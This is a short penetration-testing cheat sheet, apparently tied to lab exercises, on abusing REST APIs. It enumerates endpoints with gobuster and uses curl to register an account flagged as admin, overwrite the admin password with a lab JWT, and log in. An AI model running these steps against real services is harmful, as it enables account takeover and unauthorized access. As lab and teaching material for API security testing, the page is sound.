# 💻 Abusing APIs

_Representational State Transfer_ (REST) is used for a variety of purposes, including authentication.

Normally API patterns:

```
/api_name/v1
```

With gobuster: Create a `pattern` file:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

And execute gobuster:

```bash
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/big.txt -p pattern
```

Then use curl to access the API:

```bash
curl -i http://<ip>/users/v1
```

After getting the users API we can further check for more:

```bash
gobuster dir -u http://<ip>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

If we get 405 METHOD NOT ALLOWED,etc we can try other methods.&#x20;

We can try POST Method: `-d` for JSON data `-H` for Header

```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://<ip>/users/v1/login
```

Then we can add more _data_ to fit the API:

```bash
curl -d '{"password":"lab","username":"admin","email":"admin@htb.com","admin":"True"}' -H 'Content-Type: application/json' http://<ip>/users/v1/register
```

Then to target password API:

```bash
curl  \
  'http://<ip>/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```

When editing values use _PUT_ request

```bash
curl -X 'PUT' \
  'http://<ip>/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

Then login:

```bash
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

To send curl request to **Burp Suite**:

```
--proxy 127.0.0.1:8080
```

Site Map can be used to organize API testing
